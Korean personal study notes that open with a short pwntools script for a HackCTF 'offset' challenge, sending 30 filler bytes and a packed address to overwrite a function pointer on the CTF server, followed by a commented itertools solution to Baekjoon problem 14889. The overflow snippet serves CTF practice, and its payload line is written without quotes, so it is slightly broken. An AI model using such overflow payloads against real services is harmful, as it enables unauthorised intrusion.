# 개인공부
## python

## hackctf. offset

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3007)

p.recvuntil("Which function would you like to call?")

pay = A*30
pay += p32(0xD8)

p.sendline(pay)
p.interactive()


## 14889. 스타트와 링크

# 상황에 따라 조합함수 , 수열함수 이용하기


풀이


from itertools import combinations # 조합 함수

>> itertools 모듈 - combination 함수

>> itertools - combinations_with_replacement 함수

N = int(input())        # 반복 횟수 받기

able_borad = []     

for _ in range(N):
    able_borad.append(list(map(int,input().split())))

number_list = [i for i in range(N)]     # 멤버들의 총 리스트

res = float('inf')  #???    # 능력치 차이 최소값


'''
>>> float('inf')          # 양의 무한대
inf

>>> float('-inf')         # 음의 무한대
-inf

>>> 1e100 < float('inf')  # 무한대는 다른 모든 실수보다 크다
True

>>> 1e309                 # 너무 큰 실수는 무한대로 평가된다
inf

>>> 1e-324                # 너무 0에 가까운 실수는 0으로 평가된다
0.0

'''

def solve():
    global res

    # 조합함수를 이용해서 각각 후보자를 생성
    for c in combinations(number_list, N//2):
        # 선택된 후보와 나머지

        start_number = list(c)      
        # number_list 부터 N//2 까지 반복 하면서
        # 나온 c는 비교하기위한 첫번쨰 숫자이고

        link_number = list(set(number_list) - set(c))
        # 링크 넘버는 두번쨰 숫자이다.
        # 리스트에서 스타트리스트와 겹치는 부분만 제거해주면 된다.


        # 점수 비교 2명씩
        start_com = list(combinations(start_number,2))
        # 위의 만들어놨던 스타트 멤버와 링크멤버를 서로 비교
        link_com = list(combinations(link_number,2))

        # 점수 구하기
        start_sum = 0   # 점수 합 변수
        for x,y in start_com:
            start_sum += (able_borad[x][y] + able_borad[y][x])
        # x와 y를 받고 합에 (x,y), (y,x) 를 더해준다.

        link_sum = 0    # 점수 합 변수
        for x,y in link_com:
            link_sum += (able_borad[x][y] + able_borad[y][x])
        # x와 y를 받고 합에 (x,y), (y,x) 를 더해준다.


        # 차이를 구하는거면 함수 abs 를 사용한다.
        # 왜냐하면 음수가 나올수있기떄문에
        # abs >> 절댓값 나오게하는 함수

        if (res > abs(start_sum - link_sum)):
            res = abs(start_sum-link_sum)
            # 계속해서 res와 비교해서 최소값 도출하기
solve()
print(res)
